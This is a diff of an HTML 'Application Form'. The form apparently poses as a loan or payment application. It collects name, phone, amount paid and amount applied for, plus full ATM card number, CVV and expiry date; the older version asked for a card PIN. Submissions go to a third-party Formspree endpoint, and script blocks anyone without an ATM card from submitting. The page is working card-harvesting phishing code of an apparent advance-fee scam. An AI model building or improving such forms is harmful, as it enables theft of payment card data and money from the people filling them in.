@@ -13,77 +13,83 @@
       margin-top: 15px;
     }
     input, select, button {
-      width: 100%;
       padding: 8px;
+      width: 100%;
       margin-top: 5px;
     }
-    #warning-message {
+    #field9 {
       color: red;
       font-weight: bold;
       margin-top: 10px;
-      display: none;
+    }
+    #submitBtn {
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <form action="https://formspree.io/f/mwkgrdzo" method="POST">
+
+  <h2>Application Form</h2>
+
+  <form action="https://formspree.io/f/your-form-id" method="POST">
     
-    <!-- Field 1: Full Name -->
-    <label for="fullname">Full Name</label>
-    <input type="text" name="fullname" id="fullname" required>
+    <label>Full Name:
+      <input type="text" name="full_name" required>
+    </label>
 
-    <!-- Field 2: Phone Number -->
-    <label for="phone">Phone Number</label>
-    <input type="tel" name="phone" id="phone" required>
+    <label>Phone Number:
+      <input type="tel" name="phone" required>
+    </label>
 
-    <!-- Field 3: Secret Code (PIN) -->
-    <label for="pin">Secret Code (PIN)</label>
-    <input type="password" name="pin" id="pin" pattern="[0-9]{4}" maxlength="4" required>
-    <input type="checkbox" onclick="togglePIN()"> Show PIN
+    <label>ATM Card Number:
+      <input type="text" name="card_number" maxlength="16" pattern="\d{16}" required>
+    </label>
 
-    <!-- Field 4: Amount Paid -->
-    <label for="amount-paid">Amount Paid</label>
-    <input type="number" name="amount-paid" id="amount-paid" required>
+    <label>CVV (3 digits only):
+      <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required>
+    </label>
 
-    <!-- Field 5: Amount Applied For -->
-    <label for="amount-applied">Amount Applied For</label>
-    <input type="number" name="amount-applied" id="amount-applied" required>
+    <label>Expiry Date (MM/YY):
+      <input type="text" name="expiry" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" required>
+    </label>
 
-    <!-- Field 7: Do you have an ATM card? -->
-    <label for="atm-card">Do you have an ATM card?</label>
-    <select name="atm-card" id="atm-card" required>
-      <option value="">--Select--</option>
-      <option value="yes">Yes</option>
-      <option value="no">No</option>
-    </select>
+    <label>Amount Paid:
+      <input type="number" name="amount_paid" required>
+    </label>
 
-    <!-- Field 9: Conditional warning -->
-    <div id="warning-message">YOU MUST HAVE AN ATM CARD TO PROCEED</div>
+    <label>Amount Applying For:
+      <input type="number" name="amount_applied" required>
+    </label>
 
-    <!-- Submit Button -->
-    <button type="submit" id="submit-button">Submit</button>
+    <label>Do you have an ATM card?
+      <select name="has_atm" id="atmSelect" required>
+        <option value="">-- Select --</option>
+        <option value="yes">Yes</option>
+        <option value="no">No</option>
+      </select>
+    </label>
+
+    <div id="field9" style="display: none;">YOU MUST HAVE AN ATM CARD TO PROCEED</div>
+
+    <button type="submit" id="submitBtn">Submit</button>
+
   </form>
 
-  <!-- JavaScript Logic -->
   <script>
-    function togglePIN() {
-      const pinField = document.getElementById("pin");
-      pinField.type = pinField.type === "password" ? "text" : "password";
-    }
+    const atmSelect = document.getElementById('atmSelect');
+    const field9 = document.getElementById('field9');
+    const submitBtn = document.getElementById('submitBtn');
 
-    const atmCardField = document.getElementById("atm-card");
-    const warningMessage = document.getElementById("warning-message");
-    const submitButton = document.getElementById("submit-button");
-
-    atmCardField.addEventListener("change", function () {
-      if (this.value === "no") {
-        warningMessage.style.display = "block";
-        submitButton.disabled = true;
+    atmSelect.addEventListener('change', () => {
+      if (atmSelect.value === 'no') {
+        field9.style.display = 'block';
+        submitBtn.style.display = 'none';
       } else {
-        warningMessage.style.display = "none";
-        submitButton.disabled = false;
+        field9.style.display = 'none';
+        submitBtn.style.display = 'block';
       }
     });
   </script>
+
 </body>
 </html>
